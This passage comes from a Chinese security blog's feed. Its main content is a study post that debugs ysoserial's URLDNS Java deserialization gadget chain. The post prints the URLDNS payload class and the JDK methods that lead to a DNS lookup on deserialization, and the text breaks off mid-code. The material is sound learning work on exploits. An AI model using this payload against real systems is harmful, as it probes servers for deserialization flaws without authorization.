title="Ref"></a>Ref</h2><ol><li>java反序列化漏洞利用<ol><li>java安全漫谈反序列化(1)</li><li>白日梦组长</li></ol></li><li>CC1<ol><li><a href="https://www.anquanke.com/post/id/261724">每一条链都有一些概念的解析，再找一些资料理解就透彻了</a></li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0(%E4%B8%8A).md">信工所的大佬写的文章就是nb</a></li><li><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478">cc1_TransformedMap祖师爷</a></li><li><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/">长亭科技</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(2)_URLDNS链入门</title>
      <link href="/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"/>
      <url>/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前面巴拉巴拉一堆理论，现在来看看操作，还是要调试啊</p></blockquote><h2 id="我勒个前导配置工作啊"><a href="#我勒个前导配置工作啊" class="headerlink" title="我勒个前导配置工作啊"></a>我勒个前导配置工作啊</h2><h3 id="总结一下flow"><a href="#总结一下flow" class="headerlink" title="总结一下flow"></a>总结一下flow</h3><blockquote><p>环境配置<br>jdk1.7u21或者1.8都可以</p></blockquote><ol><li>git clone ysoserial源码</li><li>library导入jar包(不使用maven解决)</li><li>maven文件找到mainClass，进入</li><li>成功运行，配置默认debug参数</li><li>可以带参数进行运行了</li><li>references<ol><li><a href="https://wx.zsxq.com/group/2212251881/topic/244415545824541">p牛知识星球</a></li></ol></li></ol><h3 id="也算学到了经验"><a href="#也算学到了经验" class="headerlink" title="也算学到了经验"></a>也算学到了经验</h3><ol><li>记录一下过程中遇到的东西</li><li>P1: 首先是报错java版本6问题，是因为版本设置不当，在project structure中修改一下就好了</li><li>P2: 下载依赖时报错<img src="/pic/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/%E4%BE%9D%E8%B5%96%E6%8A%A5%E9%94%99.png" alt="error"><ol><li><strong>S1: 尝试配置library</strong>: 手动导入library下载intercepter3.1，发现自带的搜索中没有这个</li><li><strong>S2: 尝试配置仓库</strong>: 访问报错中的网址发现居然是400，即使是换了有intercepter3.1的仓库依然无法下载，但是这是个好思路</li></ol></li></ol><h3 id="感谢jar包救我"><a href="#感谢jar包救我" class="headerlink" title="*感谢jar包救我"></a>*感谢jar包救我</h3><blockquote><p>出师未捷身先死，常使英雄泪满襟。依赖一直有问题，最后搞清楚是库问题后也卡死了，还好有b1nb1n大哥<br>特此感谢耐心教导的b1nb1n大哥</p></blockquote><hr><blockquote><p>总结一下<br>1.其实配置环境时遇到了问题就像是做web题，都要找到方向来解决，还是要好好看报错信息再理解一下<br>2.这里其实还是工具不熟悉导致的，工欲善其事必先利其器啊，不过有提示说在library应该有敏感度了解一下java的，也是有搜“idea libraries配置”过，不过还是急了<br>3.可以横向衍生一下，搜一下”idea调试项目”类似的</p></blockquote><ol><li>b1nb1n哥一操作就好了，tql</li><li>在有源码的情况下，可以直接在library配置出+java这里导入可以运行的jar文件，然后就直接可以运行了 –&gt; 如果没有源码需要<strong>反编译一下</strong>jadx，有需要再来</li></ol><h2 id="URLDNS动手调试"><a href="#URLDNS动手调试" class="headerlink" title="URLDNS动手调试"></a>URLDNS动手调试</h2><h3 id="Gadget-Chains"><a href="#Gadget-Chains" class="headerlink" title="Gadget Chains"></a>Gadget Chains</h3><blockquote><p>参考一下p牛的安全漫谈，p牛这个思路和他说的先看源码调节这点很契合<br>原理参考一下ref</p></blockquote><ol><li><em><strong>目标导向式的调试就ok了这里</strong></em>: 一步一步深入</li><li>第一次调试成功了！！！</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ysoserial URLDNS.java</span></span><br><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br><span class="line">As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="line">deserializes, so using a Java URL object as a serialized key allows</span><br><span class="line">it to trigger a DNS lookup.</span><br><span class="line"></span><br><span class="line"><span class="comment">// mime</span></span><br><span class="line">Gadget Chain:</span><br><span class="line"> HashMap</span><br><span class="line">  HashMap.readObejct()</span><br><span class="line">   HashMpa.hash()</span><br><span class="line">    URL.hashCode()</span><br><span class="line">     URLStreamHandler.hashCode()</span><br><span class="line">      URLStreamHandler.getHostAddress()</span><br><span class="line">       IntAddress.getByName()   <span class="comment">// trigger the dns query</span></span><br></pre></td></tr></table></figure><h3 id="URLDNS-java"><a href="#URLDNS-java" class="headerlink" title="URLDNS.java"></a>URLDNS.java</h3><ol><li>从ysosrial的URLDNS.java阅读代码和<strong>注释</strong>，可以知道这条链的利用点在于getObject返回的序列化对象(就是payload)，这个类很短，不难读懂<ol><li><strong>Slient..Class详见下面的Q</strong></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><ol><li>触发序列化漏洞是readObject方法，那就来看看返回的HashMap对象的readObject方法<ol><li>根据上述payload中的u对象，跳转到<code>Key.readObject()</code></li><li>注意到是<code>URLStreamHandler</code>的子类，此处需要进入到</li><li>我使用的是java1.7u21版本，这里和网上很多文章不一样，最后是<code>putForCreate()</code>，但是进入后也有<code>hash(key)</code></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set hashSeed (can only happen after VM boot)</span></span><br><span class="line">    Holder.UNSAFE.putIntVolatile(<span class="built_in">this</span>, Holder.HASHSEED_OFFSET,</span><br><span class="line">            sun.misc.Hashing.randomHashSeed(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in number of buckets and allocate the bucket array;</span></span><br><span class="line">    s.readInt(); <span class="comment">// ignored</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read number of mappings</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">initialCapacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">            <span class="comment">// capacity chosen by number of mappings</span></span><br><span class="line">            <span class="comment">// and desired load (if &gt;= 0.25)</span></span><br><span class="line">            mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">            <span class="comment">// we have limits...</span></span><br><span class="line">            HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// find smallest power of two which holds all mappings</span></span><br><span class="line">    <span class="keyword">while</span> (capacity &lt; initialCapacity) &#123;</span><br><span class="line">        capacity &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>[capacity];</span><br><span class="line">    threshold = (<span class="type">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    useAltHashing = sun.misc.VM.isBooted() &amp;&amp;</span><br><span class="line">            (capacity &gt;= Holder.ALTERNATIVE_HASHING_THRESHOLD);</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        putForCreate(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h3><ol><li>根据ysoserial的注释，可以知道这条链的关键在于hashCode被计算(hash()会调用)，所以在<code>hash(key)</code>处进入&#x2F;断点，进入到HashMap.hash()<ol><li>可以内部逻辑不重要，重要的是跳转到了k.hashCode()，由于继承了URLStreamHandler，进入该类的hashCode一看</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><ol><li>这里的k式URL的u而不是handler，可以观察到<code>hashCode==-1</code>的时候会调用<code>handler.hashCode()</code>，下一步进入</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URLStreamHandler-hashCode"><a href="#URLStreamHandler-hashCode" class="headerlink" title="URLStreamHandler.hashCode()"></a>URLStreamHandler.hashCode()</h3><ol><li>来到了该类了，重点关注第18到25行，进入里面调用的两个函数<code>getHostAddress()</code>和<code>getHost()</code>，–&gt; 在getHostAddress()时就有dns了</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Provides the default hash calculation. May be overidden by handlers for</span></span><br><span class="line"><span class="comment"> * other protocols that have different requirements for hashCode</span></span><br><span class="line"><span class="comment"> * calculation.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> u a URL object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an &lt;tt&gt;int&lt;/tt&gt; suitable for hash table indexing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URLStreamHandler-getHostAddress"><a href="#URLStreamHandler-getHostAddress" class="headerlink" title="URLStreamHandler.getHostAddress()"></a>URLStreamHandler.getHostAddress()</h3><ol><li>进入到该函数，有<code>InetAddress.getByName(host)</code>，触发了dns查询了</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Dst-InetAddress-getByName-host"><a href="#Dst-InetAddress-getByName-host" class="headerlink" title="Dst: InetAddress.getByName(host)"></a>Dst: InetAddress.getByName(host)</h3><ol><li>结束了，可以在往深处看，也可以不了</li></ol><h2 id="URLDNS深入理解"><a href="#URLDNS深入理解" class="headerlink" title="URLDNS深入理解"></a>URLDNS深入理解</h2><h3 id="Q-为什么需要SilentURLStreamHandler类"><a href="#Q-为什么需要SilentURLStreamHandler类" class="headerlink" title="Q: 为什么需要SilentURLStreamHandler类"></a>Q: 为什么需要SilentURLStreamHandler类</h3><ol><li>这里其实不是必须的，只是在这里是ysoserial一个工具，为保证<strong>在利用时put不会产生dns解析的方法</strong></li><li><em><strong>这里又有一个大问题: <code>SilentURLStreamHandler</code>已经是URL对象的一部分了不会反序列化失败吗？因为目标主机中不会有<code>SilentURLStreamHandler</code></strong></em><ol><li>答案其实是在注释里，<strong>这种项目代码会有注释要利用好</strong></li><li>序列化：<ol><li>在序列化过程中，URL 对象的 handler 字段（即 SilentURLStreamHandler 实例）<strong>是 transient 的</strong>，这意味着它不会被序列化到输出流中。</li><li>因此，序列化后的字节流中不会包含 SilentURLStreamHandler 的实例。</li></ol></li><li>反序列化：<ol><li>在反序列化过程中，URL 对象会被重建，但 handler 字段会保持为 null，因为它是 transient 的。</li><li>这意味着在反序列化后，URL 对象将使用默认的 URLStreamHandler。</li></ol></li></ol></li></ol><h3 id="Q-为什么需要反射设置hashCode-1"><a href="#Q-为什么需要反射设置hashCode-1" class="headerlink" title="Q: 为什么需要反射设置hashCode&#x3D;-1"></a>Q: 为什么需要反射设置hashCode&#x3D;-1</h3><ol><li><p>一开始是由于<code>HashMap.readObject</code>开始的，所以先要将url对象放到HashMap对象中</p></li><li><p>注意到在<code>HashMap.put()</code>方法也会对<code>int hash = hash(key)</code>，所以这里其实就会进行一次dns查询</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里的hashCode()进入后会发现，hashCode已经被设置，在反序列化时来到这里是没有办法调用<code>handler.hashCode()</code>的了</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = 